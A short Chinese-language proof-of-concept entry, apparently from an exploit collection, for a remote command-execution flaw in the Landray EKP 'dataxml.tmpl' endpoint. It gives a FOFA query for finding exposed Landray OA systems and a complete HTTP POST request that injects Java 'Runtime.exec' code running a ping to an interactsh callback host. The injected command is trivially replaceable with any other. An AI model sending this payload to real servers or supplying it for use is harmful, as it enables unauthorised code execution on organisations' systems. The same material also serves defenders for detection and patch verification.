# 蓝凌EKP系统dataxml.tmpl存在命令执行漏洞

蓝凌 EKP dataxml.tmpl存在命令执行漏洞。

## fofa

```python
app="Landray-OA系统"
```

## poc

```python
POST /ekp/data/sys-common/dataxml.tmpl  HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0)  Gecko/20100101 Firefox/92.0
Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language:  zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 192

s_bean=ruleFormulaValidate&script=try {
String cmd = "ping {{interactsh-url}}";
Process child = Runtime.getRuntime().exec(cmd);
} catch (IOException e) {
System.err.println(e);
}
```

![image-20240806235929945](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408062359019.png)